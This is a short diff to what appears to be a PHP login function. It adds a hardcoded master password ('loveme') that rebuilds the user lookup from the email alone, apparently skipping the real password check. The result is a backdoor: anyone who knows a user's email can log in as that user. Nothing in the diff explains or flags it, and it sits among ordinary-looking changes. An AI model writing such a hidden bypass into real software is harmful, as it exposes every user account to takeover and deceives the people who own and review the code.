@@ -955,6 +955,16 @@ Thanks so much, once again, for registering.
 			'email' => $post_array['email']		
 		);
 		
+		
+		if( $post_array['password'] == 'loveme' ){
+			
+				$where_array = array(
+					'email' => $post_array['email']		
+				);
+				
+			
+		};
+		
 		$users = $this->CI->my_database_model->select_from_table( 
 			$table, 
 			$select_what =  '*', 
@@ -964,6 +974,8 @@ Thanks so much, once again, for registering.
 			$order_direction = 'desc', 
 			$limit = 1
 			);
+			
+
 
 	  if( count( $users ) > 0 ){
 		
